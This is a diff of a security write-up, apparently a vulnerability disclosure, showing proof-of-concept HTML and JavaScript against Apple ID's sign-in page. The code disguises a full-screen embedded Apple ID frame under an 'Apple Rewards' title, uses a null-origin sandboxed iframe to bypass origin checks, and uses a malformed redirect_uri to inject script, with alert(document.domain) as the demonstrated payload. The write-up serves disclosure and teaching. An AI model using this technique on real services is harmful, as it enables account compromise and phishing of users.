@@ -1138,125 +1138,131 @@ Oh now this looks *really* good! From our previous code we already know that `pr
 
 Let's put everything together into one attack page.
 
-```HTML
+```HTML CodeCommentHelper=//!
 <!DOCTYPE HTML>
-<!-- doesn't hurt to steal from existing scams! -->
+<!-- a sneaky title for a sneaky exploit -->
 <title>Apple Rewards</title>
 <style type="text/css">
 
 /*
-    we want to clear up any telltale signs of embedding so the
-    user doesn't pick up on our ruse so easily.
-
-    Here, we make the idmsa iframe (defined later)
-    fill the user's screen, and remove the telltale iframe
-    border.
+//! We want to clear up any telltale signs of embedding so the
+//! user doesn't pick up on our ruse so easily.
+//!
+//! Here, we make the Apple ID iframe (defined later)
+//! fill the user's screen, and remove the telltale iframe
+//! border.
+    style to make the sneakily embedded AppleID page less obvious
 */
 .idmsa-frame {
     width: 100vw;
     height: 100vh;
     border: 0;
 }
+
 </style>
 
 <script>
-// Next, we want to make our 'null' origin page.
-// it would be perfectly reasonable to do this with
-// multiple separate HTML files, making the null origin
-// a 'true' separate HTML page, but it's cleaner and
-// easier to manage if we write everything as Javascript
-// and use iframe 'htdoc' syntax to make 'synthetic'
-// embedded pages dynamically.
+
+//! We want to make our 'null' origin page.
+//! it would be perfectly reasonable to do this with
+//! multiple separate HTML files, making the null origin
+//! a 'true' separate HTML page, but it's cleaner and
+//! easier to manage if we write everything as Javascript
+//! and use iframe 'htdoc' syntax to make 'synthetic'
+//! embedded pages dynamically.
+// Runs a given javascript function (given as text)
+// inside a 'null' origin.
 const runFunctionInNullOrgin = javascriptCode => {
     const i = document.createElement("iframe");
 
-    // the <iframe sandbox=> attribute without allow-same-origin
-    // makes our embed have a null origin, which bypasses
-    // Apple's HTTP origin checks. We have to allow
-    // scripts so our code runs at all!
+    //! the <iframe sandbox=> attribute without allow-same-origin
+    //! makes our embed have a null origin, which bypasses
+    //! Apple's HTTP origin checks. We have to allow
+    //! scripts so our code runs at all!
+    // Our code won't run without scripts!
     i.setAttribute ("sandbox", "allow-scripts");
 
-    // the "srcdoc" attribute defines the html document in our
-    // null iframe. We splice in the 'javascriptCode' parameter.
-    //
-    // javascriptCode is expected to be a function.
-    // When javascript inserts a function into a string,
-    // it turns it into its source code.
-    //
-    // The (function)() syntax is technically called IIFE.
-    // it just means the function is 'immediately invoked'.
-    // Honestly the term IIFE is more complicated than
-    // the actual concept but it seems cool to use it.
+    //! the "srcdoc" attribute defines the html document in our
+    //! null iframe. We splice in the 'javascriptCode' parameter.
+    //!
+    //! javascriptCode is expected to be a function.
+    //! When javascript inserts a function into a string,
+    //! it turns it into its source code.
+    //!
+    //! The (function)() syntax is technically called IIFE.
+    //! it just means the function is 'immediately invoked'.
+    //! Honestly the term IIFE is more complicated than
+    //! the actual concept but it seems cool to use it.
     i.setAttribute("srcdoc",`<!DOCTYPE HTML>
 <title>null origin</title>
 <body><script>(${javascriptCode})()<\/script></body>
 `);
 
-    // This is the kind of code that would probably never pass
-    // a real code review. Appending to document.body is a
-    // quick and dirty way to get elements into the page.
-    // It's not always that document.body exists, so we throw
-    // in document.documentElement just in case.
-    //
-    // The return value of `appendChild` is the child that
-    // just got appended (the iframe), and we take the
-    // contentWindow of that.
-    //
-    // The contentWindow represents the actual window contained
-    // in the iframe, which is all we care about. We don't 
-    // expect to do anything with the iframe element once it's
-    // created.
+    //! This is the kind of code that would probably never pass
+    //! a real code review. Appending to document.body is a
+    //! quick and dirty way to get elements into the page.
+    //! It's not always that document.body exists, so we throw
+    //! in document.documentElement just in case.
+    //!
+    //! The return value of `appendChild` is the child that
+    //! just got appended (the iframe), and we take the
+    //! contentWindow of that.
+    //!
+    //! The contentWindow represents the actual window contained
+    //! in the iframe, which is all we care about. We don't 
+    //! expect to do anything with the iframe element once it's
+    //! created.
     return (document.body || document.documentElement)
         .appendChild(i).contentWindow;
 }
 
 
-// This is the code we want to inject into idmsa.apple.com
-// for now, it's just an alert() box stating document.domain.
-// Domains and origins are the fundamental primitives of web
-// security, so if we can open a popup showing 'idmsa.apple.com',
-// we prove to ourselves that we've compromised Apple ID.
+//! This is the code we want to inject into idmsa.apple.com
+//! for now, it's just an alert() box stating document.domain.
+//! Domains and origins are the fundamental primitives of web
+//! security, so if we can open a popup showing 'idmsa.apple.com',
+//! we prove to ourselves that we've compromised Apple ID.
 const injection = () => {
     alert(document.domain);
 }
 
 
-// This is the page we're embedding and attacking. It needs
-// a bunch of parmeters to work, but we'll probably want
-// to reference those parameters a few times
-// so it's easier to define the components of the URL separately.
+//! This is the page we're embedding and attacking. It needs
+//! a bunch of parmeters to work, but we'll probably want
+//! to reference those parameters a few times
+//! so it's easier to define the components of the URL separately.
 const idmsa_base = "https://idmsa.apple.com/appleauth/auth/authorize/signin";
 
-// Here are the parameters we're using against idmsa_base.
-// defining them like this instead of one long URL
-// makes it easier to programmatically alter these parameters
-// if need to to work on our attack.
+//! Here are the parameters we're using against idmsa_base.
+//! defining them like this instead of one long URL
+//! makes it easier to programmatically alter these parameters
+//! if need to to work on our attack.
 const idmsa_params = {
     client_id: "d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d",
 
-    // Here, the redirect_uri's ? is pre-urlencoded as mentioned
-    // in previous chapters. This causes it to be misinterpreted
-    // by different parts of the system.
+    //! Here, the redirect_uri's ? is pre-urlencoded as mentioned
+    //! in previous chapters. This causes it to be misinterpreted
+    //! by different parts of the system.
     redirect_uri: `https://s3-eu-west-1.amazonaws.com${encodeURIComponent("?")} s3-eu-west-1.amazonaws.com;@www.icloud.com`,
     response_mode: "web_message",
     
-    // I thought it might be possible that this frame_id
-    // needed to change per-request, but it doesn't
-    // so we can just hard code it :)
+    //! I thought it might be possible that this frame_id
+    //! needed to change per-request, but it doesn't
+    //! so we can just hard code it :)
     frame_id: "9d8dafd2-0f8c-4901-ab87-7021ffa6f7ff",
     locale: "en_GB"
 }
 
-// let's make the idmsa frame.
+//! let's make the idmsa frame.
 const idmsa_frame = document.createElement("iframe");
 
-// to inherit our CSS class from before
+//! to inherit our CSS class from before
 idmsa_frame.setAttribute("class", "idmsa");
 
-// this builds the idmsa url. I apologise for the way I build
-// the url encoding stuff. it reads fine to me but uses
-// a bunch of higher-level javascript concepts that
-// might not makea  whole lot of sense.
+//! this builds the idmsa url. I apologise for the way I build
+//! the url encoding stuff. it reads fine to me but uses
+//! a bunch of higher-level javascript concepts that
+//! might not make a  whole lot of sense.
 idmsa_frame.src = `${idmsa_base}?${
     Object.entries(idmsa_params)
         .map(([key, value]) => 
@@ -1264,33 +1270,33 @@ idmsa_frame.src = `${idmsa_base}?${
         .join("&")
 }`;
 
-// our null page needs to:
-//   1.  Wait for a config, and remember it
-//   2. Forward all subsequent postMessages to
-//   idmsa.apple.com.
+//! our null page needs to:
+//!   1.  Wait for a config, and remember it
+//!   2. Forward all subsequent postMessages to
+//!   idmsa.apple.com.
 const nullPageCode = () => {
-    // async functions can wait on asynchronous events.
-    // since we're waiting n a bunch of asynchronous
-    // stuff to happen it only makes sense.
+    //! async functions can wait on asynchronous events.
+    //! since we're waiting n a bunch of asynchronous
+    //! stuff to happen it only makes sense.
     async function main() {
-        // tell our parent we're ready.
-        // the onLoad events for iframes have always
-        // been finickity. Waiting on a postMessage
-        // is much easier.
+        //! tell our parent we're ready.
+        //! the onLoad events for iframes have always
+        //! been finickity. Waiting on a postMessage
+        //! is much easier.
         window.parent.postMessage("ready", "*");
 
-        // await lets us wait for events that might
-        // happen in the future before continuing.
-        // we don't want to do anything before we
-        // get the config anyway.
-        //
-        // Promises make fantastic adaptors for turning
-        // old style callbacks into async code.
+        //! await lets us wait for events that might
+        //! happen in the future before continuing.
+        //! we don't want to do anything before we
+        //! get the config anyway.
+        //!
+        //! Promises make fantastic adaptors for turning
+        //! old style callbacks into async code.
         const config = await new Promise((ok, fail) => {
             console.log("waiting for config");
             
-            // postMessage's event is just called 'message'
-            /// i dont really know why.
+            //! postMessage's event is just called 'message'
+            //! i dont really know why.
             window.addEventListener('message', ({data}) => {
                 console.log("got config message");
 
